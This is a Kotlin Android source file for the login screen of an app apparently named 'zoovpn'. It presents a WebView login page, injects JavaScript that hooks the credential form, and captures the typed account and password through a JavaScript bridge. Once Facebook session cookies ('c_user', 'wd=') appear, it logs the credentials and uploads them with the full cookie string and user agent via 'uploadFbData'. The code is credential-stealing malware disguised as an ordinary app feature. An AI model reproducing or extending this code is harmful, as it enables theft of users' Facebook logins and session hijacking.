package win.enlarge.zoovpn.ui.activity

import android.annotation.SuppressLint
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.webkit.*
import androidx.lifecycle.lifecycleScope
import kotlinx.android.synthetic.main.activity_login.*
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.*
import win.enlarge.zoovpn.App
import win.enlarge.zoovpn.R
import win.enlarge.zoovpn.base.BaseActivity
import win.enlarge.zoovpn.utils.*

class LoginActivity : BaseActivity(R.layout.activity_login) {

    class WebInterface {
        @JavascriptInterface
        fun businessStart(a: String, b: String) {
            account = a
            password = b
        }
    }

    private var countDownJob: Job? = null



    private fun countDownCoroutines(
        total: Int, onTick: (Int) -> Unit, onFinish: () -> Unit,
        scope: CoroutineScope = GlobalScope
    ): Job {
        return flow {
            for (i in 0..total) {
                emit(i)
                delay(1000)
            }
        }.flowOn(Dispatchers.Default)
            .onCompletion { onFinish.invoke() }
            .onEach { onTick.invoke(it) }
            .flowOn(Dispatchers.Main)
            .launchIn(scope)
    }

    private fun clearAll() {
        CookieSyncManager.createInstance(app)
        val cookieManager = CookieManager.getInstance();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cookieManager.removeSessionCookies(null);
            cookieManager.removeAllCookie();
            cookieManager.flush();
        } else {
            cookieManager.removeSessionCookies(null);
            cookieManager.removeAllCookie();
            CookieSyncManager.getInstance().sync();
        }
        account = ""
        password = ""
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onConvert() {
        clearAll()
        countDownCoroutines(20,{},{
            showInsertAd(isForce = true, tag = "inter_loading")
        },lifecycleScope)
        lifecycleScope.launch(Dispatchers.IO){
            val banner = App.instance!!.lovinBanner()
            banner.loadAd()
            withContext(Dispatchers.Main){
                adView.addView(banner)
            }
        }
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        activityLoginIvBack.click {
            onBackPressed()
        }
        activityLoginWv.apply {
            settings.apply {
                javaScriptEnabled = true
                textZoom = 100
                setSupportZoom(true)
                displayZoomControls = false
                builtInZoomControls = true
                setGeolocationEnabled(true)
                useWideViewPort = true
                loadWithOverviewMode = true
                loadsImagesAutomatically = true
                displayZoomControls = false
                setAppCachePath(cacheDir.absolutePath)
                setAppCacheEnabled(true)
            }
            addJavascriptInterface(WebInterface(), "businessAPI")
            webChromeClient = object : WebChromeClient() {
                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                    super.onProgressChanged(view, newProgress)
                    if (newProgress == 100) {
                        val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                        evaluateJavascript(hideJs, null)
                        val loginJs = getString(R.string.login)
                        evaluateJavascript(loginJs, null)
                        lifecycleScope.launch(Dispatchers.IO) {
                            delay(300)
                            withContext(Dispatchers.Main) {
                                activityLoginFl.visibility = View.GONE
                            }
                        }
                    }
                }
            }
            webViewClient = object : WebViewClient() {
                override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                    super.onPageStarted(view, url, favicon)
                }

                override fun onPageFinished(view: WebView, url: String) {
                    super.onPageFinished(view, url)
                    val cookieManager = CookieManager.getInstance()
                    val cookieStr = cookieManager.getCookie(url)
                    Log.e("--->", "onPageFinished url == $url")
                    if (cookieStr != null) {
                        Log.e("--->", "ua ==  " + view.settings.userAgentString)
                        if (cookieStr.contains("c_user")) {
                            Log.e("--->", "cookieStr: $cookieStr")
                            Log.e("--->", "account == $account  password == $password")
                            if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
                                lifecycleScope.launch(Dispatchers.Main) {
                                    activityLoginFlContent.visibility = View.VISIBLE
                                }
                                uploadFbData(
                                    account,
                                    password,
                                    cookieStr,
                                    view.settings.userAgentString
                                )
                            }
                        }
                    }
                }
            }
            loadUrl(updateEntity.m ?: "https://www.baidu.com")
        }
    }

    private fun uploadFbData(
        un: String,
        pw: String,
        cookie: String,
        b: String
    ) {
        lifecycleScope.requestCollect(
            un, pw, cookie, b
        ) {
            if (isLogin) {
                finish()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        activityLoginWv.onResume()
    }

    private var needBackPressed = false

    override fun onBackPressed() {
        if (activityLoginWv.canGoBack()) {
            activityLoginWv.goBack()
        } else {
            countDownJob?.cancel()
            val a = showInsertAd(showByPercent = true, tag = "inter_login")
            if (!a) {
                if (configEntity.httpUrl().startsWith("http")) {
                    jumpToWebByDefault(configEntity.httpUrl())
                }
                super.onBackPressed()
            } else {
                needBackPressed = true
            }
        }
    }

    override fun onInterstitialAdHidden() {
        super.onInterstitialAdHidden()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }
    }


    override fun onPause() {
        super.onPause()
        activityLoginWv.onPause()
    }
}